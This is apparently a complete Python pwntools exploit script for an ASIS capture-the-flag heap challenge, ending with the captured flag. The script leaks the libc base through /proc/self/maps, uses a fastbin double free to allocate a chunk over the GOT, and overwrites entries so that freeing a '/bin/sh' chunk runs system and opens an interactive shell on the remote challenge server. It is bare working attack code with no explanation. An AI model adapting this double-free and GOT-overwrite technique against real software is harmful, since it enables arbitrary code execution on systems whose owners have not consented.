#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = remote("128.199.247.60", 10001)
#r = process("./pray_CaNaKMgF")

s = "5. Run away\n"
r.recvuntil(s)

def Allocate(content):
    r.sendline("1")
    r.recvuntil("Length? ")
    r.sendline(str(len(content)))
    r.send(content)
    r.recvuntil(s)

def Pray(path):
    r.sendline("2")
    r.recvuntil("? ")
    r.sendline(path)
    r.recvuntil("says:")
    f = r.recvuntil("when you finish reading", drop=True)
    r.recvuntil(s) 
    return f

def Free(idx):
    r.sendline("3")
    r.recvuntil("Num? ")
    r.sendline(str(idx))
    r.recvuntil(s) 

maps = Pray("/proc/self/maps").split("\n")
libc_base = int(maps[5].split("-")[0], 16)
log.info("libc_base = " + hex(libc_base))

Allocate("A" * 80)
Allocate("B" * 80)
Allocate("/bin/sh")

Free(0)
Free(1)
Free(0)

Allocate(p64(0x601ffa) + "A" * 72) # 0
Allocate("A" * 80) # 1
Allocate("A" * 80) # 0

pause()
Allocate("A" * 14 + flat(
    libc_base + libc.symbols["system"],
    libc_base + libc.symbols["puts"],
    libc_base + libc.symbols["fread"],
    libc_base + libc.symbols["fclose"],
    libc_base + libc.symbols["isnan"],
    libc_base + libc.symbols["printf"],
    libc_base + libc.symbols["fgetc"],
    libc_base + libc.symbols["alarm"],
    ))

r.sendline("3")
r.recvuntil("Num? ")
r.sendline("2")
r.interactive()

# ASIS{D_____0nt_guesS_the_flag_nam3_th2is_i2s_n2ot_a2bout2_gue2ssin2g_th2e_na2me__2__2______}
